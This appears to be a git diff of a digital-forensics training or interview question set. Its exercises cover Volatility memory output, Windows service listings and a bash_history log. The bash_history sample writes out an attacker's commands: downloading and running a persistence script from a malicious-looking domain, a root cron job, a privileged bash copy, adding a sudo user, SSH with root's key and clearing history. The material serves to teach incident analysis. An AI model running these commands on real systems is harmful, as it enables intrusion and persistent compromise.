@@ -36,9 +36,8 @@ C:\Windows\Temp\e8dc049d-229d-4a3b-a900-8fc897f4386c.exe
 C:\Recycle\psexec.exe
 ```
 
-## 3. Refer to below output which process requires additional analyzes? Explain why. Is there a possibility for False positives?
+## 3a. Refer to below output which process requires additional analyzes? Explain why. Is there a possibility for False positives?
 ```
-Part 1.
 Volatility Foundation Volatility 2.6
 Pid      Process              Start              End                Tag              Protection
 -------  ------------------   ----------------   ----------------   ---------------  -------------
@@ -46,7 +45,7 @@ Pid      Process              Start              End                Tag         
 1548     explorer.exe         0x0000000003000000 0x0000000003010000 VadS             PAGE_READWRITE
 
 ```
-## 4. Analyze rest of it what potentaily is going on?
+## 3b. Analyze rest of it what potentaily is going on?
 ```
 Details for VAD at 0x0000000002000000:
 ---------------------------------------------------
@@ -61,6 +60,26 @@ Hex dump of first 64 bytes:
 2000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
 
 Detected PE file header at 0x2000000 in process explorer.exe.
+```
+## 4. Investigate output of bash_history can you tell me what user tried to acheive here?
+```
+ls -alh /home/user
+find / -name "config*" -exec cat {} \;
+echo "10.10.10.1" >> /etc/hosts
+ping -c 4 win-updater-live.ru
+mkdir -p /var/tmp/new_folder
+cp /bin/bash /var/tmp/new_folder/bash
+chmod +x /var/tmp/new_folder/bash
+/var/tmp/new_folder/bash -p
+echo "attacker_password" | sudo -S usermod -aG sudo attacker
+ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa attacker@192.168.1.10
+echo "0 3 * * * /tmp/persistence_script.sh" >> /var/spool/cron/crontabs/root
+wget http://win-updater-live.ru/persistence_script.sh -O /tmp/persistence_script.sh
+chmod +x /tmp/persistence_script.sh
+/tmp/persistence_script.sh
+cat /etc/passwd | grep root
+chmod 700 /home/attacker/.ssh
+history -c
 ```
 
 ## 5. During investigation of command line transcript you noticed below commands, can you explain what is going on?
@@ -216,7 +235,6 @@ schtasks /create /tn "UpdateTask" /tr "C:\Windows\System32\cmd.exe /c C:\Users\P
 ```
 Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName 
 
-
 Name                DisplayName                State    StartMode   PathName
 ----                -----------                -----    ---------   --------
 wuauserv            Windows Update             Running  Manual      C:\Windows\System32\svchost.exe -k netsvcs
@@ -226,25 +244,4 @@ Spooler             Print Spooler              Running  Auto        C:\Windows\S
 WindowsSysService   WinSys Service             Running  Auto        C:\Users\Public\notepad.exe
 SystemUpdateService System Update Service      Running  Auto        C:\Windows\Temp\system_update.exe
 UdkUserSvc_268339   Udk User Service_268339    Stopped  Manual      C:\Windows\System32\svchost.exe -k UdkSvcGroup
-```
-
-## 14. Investigate output of bash_history can you tell me what user tried to acheive here?
-```
-ls -alh /home/user
-find / -name "config*" -exec cat {} \;
-echo "10.10.10.1" >> /etc/hosts
-ping -c 4 win-updater-live.ru
-mkdir -p /var/tmp/new_folder
-cp /bin/bash /var/tmp/new_folder/bash
-chmod +x /var/tmp/new_folder/bash
-/var/tmp/new_folder/bash -p
-echo "attacker_password" | sudo -S usermod -aG sudo attacker
-ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa attacker@192.168.1.10
-echo "0 3 * * * /tmp/persistence_script.sh" >> /var/spool/cron/crontabs/root
-wget http://win-updater-live.ru/persistence_script.sh -O /tmp/persistence_script.sh
-chmod +x /tmp/persistence_script.sh
-/tmp/persistence_script.sh
-cat /etc/passwd | grep root
-chmod 700 /home/attacker/.ssh
-history -c
 ```
